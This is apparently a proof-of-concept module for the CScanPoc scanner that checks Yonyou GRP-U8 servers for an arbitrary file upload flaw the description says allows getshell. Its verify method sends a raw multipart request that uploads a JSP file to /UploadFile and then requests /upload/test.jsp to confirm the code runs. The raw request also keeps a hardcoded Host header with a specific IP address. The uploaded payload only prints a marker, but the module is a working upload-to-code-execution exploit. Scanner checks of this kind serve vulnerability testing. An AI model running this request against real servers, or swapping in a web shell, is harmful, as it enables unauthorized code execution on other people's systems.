# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0026'  # 平台漏洞编号，留空
    name = '用友 GRP-u8系统任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-08-10'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友 GRP-u8系统任意文件上传，可getshell  
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0111406'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e7caa74d-c544-4122-8b2c-32421ecb9d1f'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            raw = '''POST /UploadFile HTTP/1.1
Host: 210.44.112.101
Content-Length: 227
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVg9Q1fvRBAApMhqx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8

------WebKitFormBoundaryVg9Q1fvRBAApMhqx
Content-Disposition: form-data; name="rfile_name"; filename="test.jsp"
Content-Type: application/octet-stream

<% out.println("testvul");%>
------WebKitFormBoundaryVg9Q1fvRBAApMhqx--'''
            code, head, res, errcode, finalurl = hh.http(
                arg+"UploadFile", raw=raw)
            verify_url = arg+"/upload/test.jsp"
            code, head, res, errcode, finalurl = hh.http(verify_url)
            if code == 200 and "testvul" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
